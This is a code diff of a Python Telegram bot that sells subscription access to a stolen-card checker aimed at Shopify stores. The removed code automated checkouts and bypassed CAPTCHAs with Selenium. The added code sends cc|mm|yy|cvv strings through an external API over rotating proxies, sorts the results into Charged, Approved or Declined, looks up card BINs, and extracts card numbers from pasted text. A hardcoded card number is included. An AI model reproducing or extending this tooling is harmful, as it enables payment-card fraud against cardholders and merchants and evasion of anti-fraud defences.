+
+    'no session token', 'no checkout token found', 'checkout token not found',
+
+    'no checkout token', 'checkout token is empty', 'tokenize_fail', 'tax ammount empty',
+
+    'tax amount empty', 'del ammount empty', 'site not supported for now',
+
+    'payment base card not supported', 'no product found', 'checkout is not available',
+
+    'cart is empty', 'checkout_expired', 'checkout_not_found', 'no shipping methods available',
+
+    'site error', 'site dead', 'server error', 'internal server error', 'timeout',
+
+    'connection error', 'connection failed', 'timed out', 'cloudflare', 'access denied',
+
+    'bad gateway', 'service unavailable', 'gateway timeout',
+
+    # Rejected responses - these indicate dead sites
+
+    'empty submit response',
+
+    'empty submit',
+
+    'no valid payment method',
+
+    'no valid payment method found',
+
+    'unable to get payment token',
+
+    'cart failed with status 429',
+
+    'cart failed with status 503',
+
+]
+
+
+
+PROXY_ERROR_KEYWORDS = ['proxy dead', 'proxy error', 'proxy timeout', 'proxy connection failed']
+
+
+
+def is_site_error(text):
+
+    if not text:
+
+        return True
+
+    lower = text.lower().strip()
+
+    return any(kw in lower for kw in SITE_ERROR_KEYWORDS) or lower == 'na'
+
+
+
+def is_proxy_error(text):
+
+    if not text:
+
         return False
-    code = str(result.get("error_code", "")).upper()
-    msg = str(result.get("message", "")).upper()
-    return "CAPTCHA" in code or "CAPTCHA" in msg or "CHECKPOINT" in code or "CHECKPOINT" in msg
+
+    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)
 
 
-async def run_shopify_check(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None):
-    global _active_checks, _check_semaphore
-    
-    # تم التعديل: إضافة حد أقصى للشيكات المتزامنة
-    if _active_checks > 15:
-        return {"status": "Error", "message": "Server busy, try again", "error_code": "SERVER_BUSY"}
-    
-    if _check_semaphore is None:
-        _check_semaphore = asyncio.Semaphore(_MAX_CONCURRENT_CHECKS)
-    async with _check_semaphore:
-        _active_checks += 1
-        try:
-            return await _run_shopify_check_inner(site_url, card_str, proxy_url, verbose, discord_console_webhook, timeout, max_captcha_retries=max_captcha_retries)
-        finally:
-            _active_checks -= 1
 
-async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None):
-    site_url = site_url.strip().rstrip("/")
-    parts = card_str.strip().replace(" ", "").split("|")
-    if len(parts) != 4:
-        return {"status": "Error", "message": "Invalid format. Use cc|mm|yy|cvv"}
-    cc, mon, year, cvv = parts[0], parts[1], parts[2], parts[3]
-    
-    timeout = max(float(timeout), 60.0)
-    
-    proxy_list = []
-    if proxy_url:
-        if "," in proxy_url:
-            proxy_list = [format_proxy(p.strip()) for p in proxy_url.split(",") if p.strip()]
-            proxy_list = [p for p in proxy_list if p]
-        else:
-            formatted = format_proxy(proxy_url)
-            if formatted:
-                proxy_list = [formatted]
+# ====================== URL NORMALIZATION ======================
 
-    captcha_retries = max_captcha_retries if max_captcha_retries is not None else _CAPTCHA_MAX_RETRIES
-    proxy_use = random.choice(proxy_list) if proxy_list else None
-    fingerprint = get_random_fingerprint()
+def normalize_site_url(url):
 
-    if verbose:
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] Attempt — proxy={proxy_use and proxy_use[:30]}... | captcha_retries={captcha_retries}")
+    url = url.strip().lower()
+
+    url = re.sub(r'^https?://', '', url)
+
+    url = url.rstrip('/')
+
+    if url.startswith('www.'):
+
+        url = url[4:]
+
+    if '/' in url:
+
+        url = url.split('/')[0]
+
+    return url
+
+
+
+# ====================== GATEWAY DETECTION ======================
+
+async def detect_payment_gateway(site, proxy_data=None, http_session=None):
+
+    test_card = "5154623245618097|03|2032|156"
 
     try:
-        async with _create_async_client(proxy_url=None, timeout=20.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
-            if _CAPTCHA_SOLVER_AVAILABLE:
+
+        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
+
+        s = http_session or (await get_user_http_session(0, "site"))
+
+        async with s.get(url, timeout=30) as resp:  # Increased to 30s for slow sites
+
+            if resp.status != 200:
+
+                return 'dead'
+
+            try:
+
+                raw = await resp.json(content_type=None)
+
+            except:
+
+                return 'unknown'
+
+            
+
+            rm = str(raw.get('Response', '')).lower()
+
+            gw = str(raw.get('Gate', raw.get('Gateway', ''))).lower()
+
+            
+
+            # ===== REJECT DEAD RESPONSES =====
+
+            # If any rejected response is found, reject the site immediately
+
+            for rejected in REJECTED_RESPONSES:
+
+                if rejected in rm:
+
+                    return 'dead'
+
+            
+
+            # ===== ACCEPT ONLY SPECIFIC RESPONSES =====
+
+            # Check if response is in accepted list
+
+            is_accepted = False
+
+            for accepted in ACCEPTED_RESPONSES:
+
+                if accepted in rm:
+
+                    is_accepted = True
+
+                    break
+
+            
+
+            if not is_accepted:
+
+                return 'dead'
+
+            
+
+            if 'shopify' in gw:
+
+                return 'shopify'
+
+            
+
+            if is_site_error(rm):
+
+                return 'dead'
+
+            
+
+            if gw and gw != '' and gw != 'unknown':
+
+                return gw
+
+            
+
+            if rm and not is_site_error(rm):
+
+                return 'shopify'
+
+            
+
+            return 'unknown'
+
+    except:
+
+        return 'error'
+
+
+
+async def get_site_product_price(site, proxy_data=None, http_session=None):
+
+    test_card = "5154623245618097|03|2032|156"
+
+    try:
+
+        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
+
+        s = http_session or (await get_user_http_session(0, "site"))
+
+        async with s.get(url, timeout=30) as resp:  # Increased to 30s for slow sites
+
+            if resp.status != 200:
+
+                return None
+
+            try:
+
+                raw = await resp.json(content_type=None)
+
+            except:
+
+                return None
+
+            
+
+            price = raw.get('Price', '-')
+
+            if price and price != '-':
+
                 try:
-                    cached = get_cached_cookies(site_url)
-                    if cached:
-                        injected = 0
-                        for cname, cval in cached.items():
-                            try:
-                                if hasattr(session, '_s') and hasattr(session._s, 'cookies'):
-                                    session._s.cookies.set(cname, str(cval))
-                                    injected += 1
-                                elif hasattr(session, 'cookies'):
-                                    session.cookies.set(cname, str(cval))
-                                    injected += 1
-                            except Exception:
-                                pass
-                        if injected and verbose:
-                            print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] \U0001f36a Using {injected} cached cookies (CAPTCHA skip)")
-                except Exception:
+
+                    price_str = str(price).replace('$', '').replace(',', '').strip()
+
+                    price_val = float(price_str)
+
+                    if price_val >= 0:
+
+                        return round(price_val, 2)
+
+                except:
+
                     pass
 
-            result = await asyncio.wait_for(
-                _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=proxy_use, verbose=verbose, discord_console_webhook=discord_console_webhook),
-                timeout=float(timeout),
-            )
-    except asyncio.TimeoutError:
-        result = {"status": "Error", "message": "Timeout"}
-    except Exception as e:
-        if verbose and not isinstance(e, _NETWORK_ERRORS):
-            import traceback
-            traceback.print_exc()
-        elif verbose:
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] Network error: {type(e).__name__}: {str(e)[:120]}")
-        result = {"status": "Error", "message": str(e)[:200]}
+            return None
 
-    if _is_captcha_result(result) and captcha_retries > 0 and _CAPTCHA_SOLVER_AVAILABLE:
-        _log_verbose(verbose, "\U0001f916 CAPTCHA detected — attempting Selenium bypass...", discord_webhook=discord_console_webhook)
+    except:
+
+        return None
+
+
+
+async def verify_site_full(site, proxy_data=None, http_session=None, max_retries=1):
+
+    try:
+
+        gateway = await detect_payment_gateway(site, proxy_data, http_session)
+
+        price = await get_site_product_price(site, proxy_data, http_session)
+
         
-        checkout_url = result.get("_checkout_url") or f"{site_url}/checkout"
+
+        # Reject specific gateways (Case-insensitive check)
+        gw_lower = str(gateway).lower()
+        if any(rj.lower() in gw_lower for rj in REJECTED_GATEWAYS):
+            return {
+                'site': site,
+                'status': 'rejected',
+                'reason': f'Rejected gateway: {gateway}',
+                'gateway': gateway,
+                'price': None
+            }
         
+
+        if gateway == 'dead' or gateway == 'unknown' or gateway == 'error':
+
+            return {
+
+                'site': site,
+
+                'status': 'rejected',
+
+                'reason': f'Gateway detection failed: {gateway}',
+
+                'gateway': gateway,
+
+                'price': None
+
+            }
+
+        
+
+        if price is not None and price < 0.01:
+            price = None
+        
+
+        return {
+
+            'site': site,
+
+            'status': 'alive',
+
+            'gateway': gateway,
+
+            'price': price,
+
+            'price_val': price if price else 999.0,
+
+            'reason': None
+
+        }
+
+        
+
+    except Exception as e:
+
+        return {
+
+            'site': site,
+
+            'status': 'error',
+
+            'reason': str(e)[:50],
+
+            'gateway': 'unknown',
+
+            'price': None
+
+        }
+
+
+
+# ====================== MESSAGE SYSTEM ======================
+
+def build_entities(html_text, emoji_ids=None):
+    try:
+        text, entities = thtml.parse(html_text)
+        if emoji_ids:
+            idx, utf16_pos = 0, 0
+            for ch in text:
+                if ch == PE and idx < len(emoji_ids):
+                    try:
+                        entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
+                    except:
+                        pass
+                    idx += 1
+                utf16_pos += 2 if ord(ch) > 0xFFFF else 1
+        return text, sorted(entities, key=lambda e: e.offset)
+    except:
+        return html_text, []
+
+
+
+async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
+
+    try:
+
+        text, entities = build_entities(html_text, emoji_ids)
+
+        return await asyncio.wait_for(
+
+            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
+
+            timeout=15
+
+        )
+
+    except:
+
         try:
-            solver_result = await solve_shopify_captcha(
-                checkout_url=checkout_url,
-                proxy_url=proxy_use,
-                timeout=55,
+
+            return await asyncio.wait_for(
+
+                event.reply(html_text[:4000], parse_mode='html', link_preview=False),
+
+                timeout=10
+
             )
-            
-            if solver_result.get("solved"):
-                browser_html = solver_result.get("page_html", "")
-                browser_url = solver_result.get("final_url", "")
-                browser_cookies = solver_result.get("cookies", {})
-                browser_session_token = solver_result.get("session_token")
-                
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \u2705 Selenium BYPASSED | url={browser_url[:60]} | cookies={len(browser_cookies)} | session={'yes' if browser_session_token else 'no'}")
-                
-                from captcha_solver import do_full_browser_checkout
-                
-                info2 = ShopifyAuto().get_random_info()
-                info2["price"] = price if 'price' in dir() else ""
-                info2["product"] = product_title if 'product_title' in dir() else ""
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \U0001f4dd Filling form & submitting in browser...")
-                
-                browser_result = await do_full_browser_checkout(
-                    cc=cc, mon=mon, year=year, cvv=cvv,
-                    info=info2,
-                    timeout=45
-                )
-                
-                status = browser_result.get("status", "Error")
-                msg = browser_result.get("message", "")[:60]
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] [gg] \U0001f4e6 Browser result: {status} | {msg}")
-                
-                result = browser_result
-                if status in ("Charged", "Declined", "Approved") and browser_cookies:
-                    cache_cookies(site_url, browser_cookies)
-            else:
-                _log_verbose(verbose, f"\u26a0\ufe0f Selenium solver failed: {solver_result.get('error', 'unknown')}", discord_webhook=discord_console_webhook)
-        except Exception as e:
-            _log_verbose(verbose, f"\u26a0\ufe0f Selenium solver exception: {str(e)[:100]}", discord_webhook=discord_console_webhook)
+
+        except:
+
+            return None
+
+
+
+async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
+    try:
+        text, entities = build_entities(html_text, emoji_ids)
+        return await asyncio.wait_for(
+            client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
+            timeout=15
+        )
+    except Exception as e:
+        # Fallback to plain HTML if entities fail
+        try:
+            return await client_instance.send_message(chat_id, html_text, buttons=buttons, file=file, parse_mode='html', link_preview=False)
+        except:
+            return None
+
+async def styled_edit(event, html_text, buttons=None, emoji_ids=None):
+    try:
+        text, entities = build_entities(html_text, emoji_ids)
+        return await event.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False)
+    except Exception as e:
+        # Fallback to plain HTML if entities fail
+        try:
+            return await event.edit(html_text, buttons=buttons, parse_mode='html', link_preview=False)
+        except:
+            # Last resort: Clean text
+            clean_text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', html_text)
+            clean_text = clean_text.replace('<b>', '').replace('</b>', '').replace('<i>', '').replace('</i>', '').replace('<code>', '').replace('</code>', '')
+            try:
+                return await event.edit(clean_text, buttons=buttons)
+            except:
+                return None
+
+
+
+
+
+
+
+def pbtn(text, data=None, url=None, style=None):
+
+    if url:
+
+        return Button.url(text, url)
+
+    if data:
+
+        return Button.inline(text, data.encode() if isinstance(data, str) else data)
+
+    return Button.inline(text, b"none")
+
+
+
+# ====================== FORCE JOIN ======================
+
+async def is_user_joined(user_id):
+
+    if user_id in ADMIN_ID:
+
+        return True
+
+    now = time.time()
+
+    cached = _JOIN_CACHE.get(user_id)
+
+    if cached and now - cached < 600:
+
+        return True
+
+    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
+
+        try:
+
+            r = await client(GetParticipantRequest(channel=cid, participant=user_id))
+
+            if isinstance(r.participant, ChannelParticipantBanned):
+
+                return False
+
+        except UserNotParticipantError:
+
+            return False
+
+        except:
+
+            pass
+
+    _JOIN_CACHE[user_id] = now
+
+    return True
+
+
+
+async def force_join_check(event):
+
+    if event.sender_id in ADMIN_ID:
+
+        return True
+
+    if await is_user_joined(event.sender_id):
+
+        return True
+
+    _JOIN_CACHE.pop(event.sender_id, None)
+
+    buttons = [
+
+        [pbtn("🔗 " + bs("Join Channel"), url=JOIN_CHANNEL_LINK)],
+
+        [pbtn("✅ " + bs("I have joined"), data="check_joined")]
+
+    ]
+
+    text = f"""🔒 <b>{bs('Access Locked')}</b> 🔒
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⭐ <b>{bs('Join to Unlock')}</b>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📢 <b>{bs('Channel')}:</b> <i>{bs('ReGict7')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>"""
+
+    await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"]])
+
+    return False
+
+
+
+# ====================== MAINTENANCE ======================
+
+async def set_maintenance_mode(enabled):
+
+    global _MAINTENANCE_CACHE
+
+    try:
+
+        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
+
+            await f.write(json.dumps({"maintenance": enabled}))
+
+        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
+
+    except:
+
+        pass
+
+
+
+async def get_maintenance_mode():
+
+    global _MAINTENANCE_CACHE
+
+    now = time.time()
+
+    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
+
+        return _MAINTENANCE_CACHE["enabled"]
+
+    try:
+
+        if not os.path.exists(MAINTENANCE_FILE):
+
+            return False
+
+        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
+
+            data = json.loads(await f.read())
+
+            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
+
+            return _MAINTENANCE_CACHE["enabled"]
+
+    except:
+
+        return False
+
+
+
+async def check_maintenance(event):
+
+    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
+
+        await styled_reply(event, f"""🔧 <b>{bs('Maintenance')}</b> 🔧
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚠️ <b>{bs('Bot under maintenance')}</b>
+
+⏳ <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
+
+        return True
+
+    return False
+
+
+
+# ====================== ACCESS ======================
+
+async def can_use(user_id, chat):
+
+    await ensure_user(user_id)
+
+    if await is_banned_user(user_id):
+
+        return False, "banned"
+
+    sub = await get_user_subscription(user_id)
+
+    if sub["is_active"] or user_id in ADMIN_ID:
+
+        return True, f"{sub['plan'] if sub['is_active'] else 'Admin'}_private"
+
+    return False, "no_subscription"
+
+
+
+async def require_subscription(event):
+
+    uid = event.sender_id
+
+    if uid in ADMIN_ID:
+
+        return True
+
+    if await is_banned_user(uid):
+
+        t, e = banned_user_message()
+
+        await styled_reply(event, t, emoji_ids=e)
+
+        return False
+
+    if await is_user_subscribed(uid):
+
+        return True
+
+    await send_no_subscription_message(event)
+
+    return False
+
+
+
+async def send_no_subscription_message(event):
+
+    text = f"""🚫 <b>{bs('Access Denied')}</b> 🚫
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚠️ <b>{bs('No Active Subscription')}</b>
+
+💡 <i>{bs('Subscribe using the payment bot:')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🤖 <b>@{PAYMENT_BOT_USERNAME}</b>
+
+📝 <code>/subscribe</code> {bs('to buy a plan')}"""
+
+    await styled_reply(event, text, emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"], CE["link"]])
+
+
+
+def banned_user_message():
+
+    return f"""🚫 <b>{bs('Banned')}</b> 🚫
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⛔ <b>{bs('You are banned from using Sonik')}</b>
+
+📞 <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]
+
+
+
+# ====================== UTILITIES ======================
+
+def extract_cc(text):
+
+    if not text:
+
+        return []
+
+    cards = []
+
+    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
+
+        if len(y) == 2: y = '20' + y
+
+        cards.append(f"{c}|{m}|{y}|{cv}")
+
+    if not cards:
+
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
+
+            cards.append(f"{c}|{m}|{y}|{cv}")
+
+    if not cards:
+
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
+
+            cards.append(f"{c}|{m}|20{y}|{cv}")
+
+    return list(dict.fromkeys(cards))
+
+
+
+def extract_urls_from_text(text):
+
+    seen, result = set(), []
+
+    for line in text.split('\n'):
+
+        line = line.strip()
+
+        if not line: continue
+
+        m = re.match(r'(https?://[^\s{(]+)', line)
+
+        if m:
+
+            norm = normalize_site_url(m.group(1).rstrip('/'))
+
+            if norm and norm not in seen:
+
+                seen.add(norm)
+
+                result.append(norm)
+
+            continue
+
+        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].strip()
+
+        if cleaned:
+
+            norm = normalize_site_url(cleaned)
+
+            if norm and norm not in seen:
+
+                seen.add(norm)
+
+                result.append(norm)
 
     return result
 
-def _log_verbose(verbose, msg, discord_webhook=None):
-    if verbose:
-        important_keywords = [
-            "Result:", "CAPTCHA", "Timeout", "Error", "Declined", "Approved", 
-            "Charged", "Failed", "3DS", "CARD_DECLINED", "GENERIC_ERROR",
-            "Check start", "Check done"
-        ]
-        
-        if any(keyword in msg for keyword in important_keywords):
-            line = f"[{datetime.now().strftime('%H:%M:%S')}] [gg] {msg}"
-            print(line)
 
-import threading as _threading
-_products_cache = {}
-_PRODUCTS_CACHE_TTL = 60
-_PRODUCTS_CACHE_MAX = 200
 
-def _get_cached_products(site_url):
-    entry = _products_cache.get(site_url)
-    if entry and _time.time() - entry["ts"] < _PRODUCTS_CACHE_TTL:
-        return entry["data"]
-    return None
+def parse_proxy_format(proxy):
 
-def _set_cached_products(site_url, products):
-    _products_cache[site_url] = {"data": products, "ts": _time.time()}
-    if len(_products_cache) > _PRODUCTS_CACHE_MAX:
-        now = _time.time()
-        stale = [k for k, v in _products_cache.items() if now - v["ts"] > _PRODUCTS_CACHE_TTL]
-        for k in stale:
-            _products_cache.pop(k, None)
+    proxy = proxy.strip()
 
-def _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, delivery_option_handle=None, requires_shipping=True, delivery_strategy_handle=None):
-    if not requires_shipping:
-        line = {
-            "selectedDeliveryStrategy": {
-                "deliveryStrategyMatchingConditions": {
-                    "estimatedTimeInTransit": {"any": True},
-                    "shipments": {"any": True}
-                },
-                "options": {}
-            },
-            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-            "deliveryMethodTypes": ["NONE"],
-            "expectedTotalPrice": {"any": True},
-            "destinationChanged": False,
-        }
-        if delivery_line_stable_id:
-            line["stableId"] = delivery_line_stable_id
-        return {
-            "deliveryLines": [line],
-            "noDeliveryRequired": [],
-            "useProgressiveRates": False,
-            "prefetchShippingRatesStrategy": None,
-        }
-    strategy = {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}
-    if delivery_option_handle:
-        strategy = {
-            "selectedDeliveryOptions": [{"handle": delivery_option_handle}],
-            "deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}},
-            "options": {},
-        }
-    line = {
-        "selectedDeliveryStrategy": strategy,
-        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-        "destination": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
-        "deliveryMethodTypes": ["SHIPPING"],
-        "expectedTotalPrice": {"any": True},
-        "destinationChanged": destination_changed,
-    }
-    if delivery_line_stable_id:
-        line["stableId"] = delivery_line_stable_id
-    return {
-        "deliveryLines": [line],
-        "noDeliveryRequired": [],
-        "useProgressiveRates": False,
-        "prefetchShippingRatesStrategy": None,
-    }
+    pt = 'http'
 
-async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=None, verbose=False, discord_console_webhook=None):
-    site = site_url
-    shop = ShopifyAuto(fingerprint=fingerprint)
-    last_completion = None
-    last_graphql_errors = None
-    _steps = []
-    product_header = {k: v for k, v in fingerprint.items() if k.lower() in _HEADER_FILTER_FULL}
-    if not any(k.lower() == "user-agent" for k in product_header):
-        product_header["User-Agent"] = shop.user_agent
+    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
+
+    if pm:
+
+        pt, proxy = pm.group(1).lower(), pm.group(2)
+
+    h = p = u = pw = ''
+
+    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
+
+    if m:
+
+        u, pw, h, p = m.groups()
+
+    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
+
+        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
+
+        ph, pp, pu, ppw = m2.groups()
+
+        if 0 < int(pp) <= 65535:
+
+            h, p, u, pw = ph, pp, pu, ppw
+
+    elif re.match(r'^([^:@]+):(\d+)$', proxy):
+
+        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
+
+        h, p = m3.groups()
+
+    else:
+
+        return None
+
+    if not h or not p:
+
+        return None
 
     try:
-        _home_headers = {k: v for k, v in product_header.items()}
-        _home_headers["Sec-Fetch-Dest"] = "document"
-        _home_headers["Sec-Fetch-Mode"] = "navigate"
-        _home_headers["Sec-Fetch-Site"] = "none"
-        _home_headers["Sec-Fetch-User"] = "?1"
-        await _retry_async_request(session.get, site, headers=_home_headers)
-        await asyncio.sleep(random.uniform(0.3, 0.9))
-    except Exception:
+
+        if not (0 < int(p) <= 65535):
+
+            return None
+
+    except:
+
+        return None
+
+    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
+
+    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
+
+
+
+async def test_proxy(proxy_url):
+
+    try:
+
+        s = await get_proxy_session()
+
+        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
+
+            if r.status == 200:
+
+                return True, (await r.json()).get('ip', '?')
+
+            return False, None
+
+    except:
+
+        return False, None
+
+
+
+async def test_proxies_batch(proxies_list):
+
+    if not proxies_list:
+
+        return []
+
+    sem = asyncio.Semaphore(PROXY_CHECK_BATCH)
+
+    async def test_one(p):
+
+        async with sem:
+
+            return await test_proxy(p['proxy_url'])
+
+    
+
+    results = await asyncio.gather(*[test_one(p) for p in proxies_list], return_exceptions=True)
+
+    return results
+
+
+
+async def get_bin_info(cn):
+
+    """Get BIN info with caching for performance"""
+
+    global _BIN_CACHE, _BIN_CACHE_TIME
+
+    
+
+    bin_prefix = cn[:6]
+
+    
+
+    if bin_prefix in _BIN_CACHE:
+
+        cache_time = _BIN_CACHE_TIME.get(bin_prefix, 0)
+
+        if time.time() - cache_time < _BIN_CACHE_TTL:
+
+            return _BIN_CACHE[bin_prefix]
+
+    
+
+    try:
+
+        s = await get_bin_session()
+
+        async with _BIN_SEM:
+
+            async with s.get(f'https://bins.antipublic.cc/bins/{bin_prefix}') as r:
+
+                if r.status != 200:
+
+                    result = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
+
+                else:
+
+                    d = await r.json(content_type=None)
+
+                    result = {
+
+                        "brand": d.get('brand', '-'),
+
+                        "type": d.get('type', '-'),
+
+                        "level": d.get('level', '-'),
+
+                        "bank": d.get('bank', '-'),
+
+                        "country": d.get('country_name', '-'),
+
+                        "flag": d.get('country_flag', '🏳️')
+
+                    }
+
+                _BIN_CACHE[bin_prefix] = result
+
+                _BIN_CACHE_TIME[bin_prefix] = time.time()
+
+                return result
+
+    except:
+
+        result = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
+
+        _BIN_CACHE[bin_prefix] = result
+
+        _BIN_CACHE_TIME[bin_prefix] = time.time()
+
+        return result
+
+
+
+# ====================== SHOPIFY API ======================
+
+def build_api_url(site, cc, proxy_data=None):
+
+    if not site.startswith('http'):
+
+        site = f'https://{site}'
+
+    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
+
+    if proxy_data:
+
+        ip, port = proxy_data['ip'], proxy_data['port']
+
+        un, pw = proxy_data.get('username'), proxy_data.get('password')
+
+        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
+
+        url += f'&proxy={quote(ps, safe="")}'
+
+    return url
+
+
+
+def classify_response(rj):
+
+    ar = str(rj.get('Response', ''))
+
+    price = rj.get('Price', '-')
+
+    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
+
+    if price is not None and price != '-':
+
+        price = f"${price}"
+
+    rl = ar.lower()
+
+    
+
+    if is_site_error(ar):
+
+        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
+
+    
+
+    ch = ['order_paid', 'order_placed', 'charged', 'payment successful']
+
+    ap = ['otp_required', '3d_authentication', 'insufficient_funds', 'cvc', '3ds_required']
+
+    dc = ['card_declined', 'do_not_honor', 'stolen_card', 'expired_card', 'decline']
+
+    
+
+    if any(k in rl for k in ch):
+
+        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
+
+    if any(k in rl for k in ap):
+
+        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
+
+    if any(k in rl for k in dc):
+
+        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
+
+    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
+
+
+
+async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
+
+    uid = user_id or "?"
+
+    try:
+
+        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
+
+        s = http_session or (await get_user_http_session(uid, "sp"))
+
+        async with s.get(url) as r:
+
+            if r.status != 200:
+
+                return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
+
+            try:
+
+                rj = await r.json(content_type=None)
+
+            except:
+
+                return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
+
+        result = classify_response(rj)
+
+        result["card"] = card
+
+        result["site"] = site
+
+        return result
+
+    except asyncio.TimeoutError:
+
+        return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
+
+    except Exception as e:
+
+        return {"Response": str(e)[:100], "Price": "-", "Gateway": "Unknown", "Status": "SiteError", "card": card, "site": site}
+
+
+
+async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
+
+    if not sites:
+
+        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}
+
+    tried_sites = set()
+
+    tried_proxies = set()
+
+    last = None
+
+    for attempt in range(max_retries):
+
+        if cancel_check and cancel_check():
+
+            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}
+
+        if rotator:
+
+            site = rotator.pick_site(sites, exclude=tried_sites)
+
+        else:
+
+            available = [s for s in sites if s not in tried_sites] or list(sites)
+
+            site = random.choice(available)
+
+        tried_sites.add(site)
+
+        proxy_data = None
+
+        if proxies_data:
+
+            if rotator:
+
+                proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
+
+            else:
+
+                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
+
+                proxy_data = random.choice(available_px)
+
+            if proxy_data:
+
+                tried_proxies.add(proxy_data.get('proxy_url'))
+
+        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
+
+        if result.get("Status") != "SiteError":
+
+            if rotator:
+
+                rotator.report_site_ok(site)
+
+                if proxy_data:
+
+                    rotator.report_proxy_ok(proxy_data.get('proxy_url'))
+
+            return result
+
+        if rotator:
+
+            rotator.report_site_fail(site)
+
